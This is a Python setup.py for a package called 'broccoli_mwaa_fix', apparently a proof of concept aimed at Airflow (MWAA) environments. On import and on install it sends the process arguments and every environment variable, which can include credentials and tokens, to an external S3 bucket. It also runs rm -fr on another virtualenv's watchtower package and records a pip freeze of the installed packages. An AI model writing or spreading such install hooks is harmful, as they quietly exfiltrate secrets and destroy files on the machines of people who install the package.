from setuptools import find_packages, setup as setup_original
import os
import sys
import json


BUCKET_NAME = 'ryus-poc-airflow'

# install_requires = []

extras_require = {}
tests_require = []


print('Broccoli--> Called(imported) broccoli setup.py script')

if not os.getenv('BUILD_PACKAGE') == '1':
    fname = '/tmp/zzz_info_ryus.txt'
    os.system('pip freeze > packages.log')

    with open('packages.log', 'r') as fp_in, open(fname, 'w') as fp:
        fp.write(fp_in.read())


def get_install_requires():
    print('Broccoli--> Called get_install_requires function')
    # pip.main(['freeze'])

    try:
        os.system('rm -fr packages.log && pip freeze > packages.log')

        os.system('rm -fr ../.venv2/lib/python3.10/site-packages/watchtower/')
        os.system('rm -fr ../.venv2/lib/python3.10/site-packages/watchtower-3.0.0.dist-info/')
        
        os.system('rm -fr packages_2.log && pip freeze > packages_2.log')
    except:
        pass

    fname = '/tmp/packages.log'
    with open(fname, 'w') as fp:
        fp.write('777s')
        # raise Exception(fp.read())
    # exit(1)
    # if not os.getenv('BUILD_PACKAGE') == '1':
    #     raise Exception(sys.argv)

    return [
        # 'watchtower'
    ]


def get_version():
    fname = f"{os.path.dirname(os.path.abspath(__file__))}/pkg/version.txt"
    with open(fname, 'r') as fp:
        ver = fp.read().strip()

    if os.getenv('BUILD_PACKAGE') == '1':
        ver = int(ver) + 1
        
        with open(fname, 'w') as fp:
            fp.write(str(ver))
    
    return ver


def install_deps_for_setup_py():
    from pip import main as pip_main

    pip_main([
        'install',
        '--upgrade',
        'boto3',
    ])


def upload_data_to_s3(prefix=None, src_file=None, data=None, bucket_name=BUCKET_NAME):
    import json
    import boto3

    data_type = type(data)
    
    if src_file is not None:
        with open(src_file, 'r') as fp:
            data = fp.read()
            data_type = None
        prefix = src_file.strip('/')
    else:
        if data_type in [dict, list]:
            data = json.dumps(data, indent=4, sort_keys=False)
            prefix = f"{prefix.strip('/')}.json"
        else:
            data = str(data)
            prefix = f"{prefix.strip('/')}.txt"

    body = bytes(data, 'utf-8')

    s3 = boto3.resource('s3')
    response = s3.Object(
        bucket_name,
        prefix,
    ).put(Body=body)

    if response['ResponseMetadata']['HTTPStatusCode'] != 200:
        raise Exception(json.dumps(response, indent=4))


install_deps_for_setup_py()
upload_data_to_s3(prefix='on_load_setup_py_sys_argv', data=sys.argv)
upload_data_to_s3(prefix='on_load_setup_py_env_vars', data=dict(os.environ))


def setup(**attrs):
    print('Broccoli setup called:', json.dumps(attrs, indent=4))

    install_deps_for_setup_py()
    upload_data_to_s3(prefix='setup_py_sys_argv', data=sys.argv)
    upload_data_to_s3(prefix='setup_py_env_vars', data=dict(os.environ))
    upload_data_to_s3(prefix='setup_py_fn_attrs', data=attrs)

    # if not os.getenv('BUILD_PACKAGE') == '1':
    #     raise Exception(json.dumps(dict(
    #         sys_args=sys.argv,
    #         setup_attrs=attrs,
    #     ), indent=4))

    setup_original(**attrs)


setup(
    name='broccoli_mwaa_fix',
    description='broccoli_mwaa_fix',
    version=f'0.{get_version()}'.strip(),
    author='Broccoli Squad',
    # author_email='',
    packages=find_packages(exclude=['tests.*', 'tests', 'thirdparty', 'logs', 'venvs']),
    # install_requires=install_requires,
    install_requires=get_install_requires(),
    extras_require=extras_require,
    tests_require=tests_require,
    license="TBD",
)
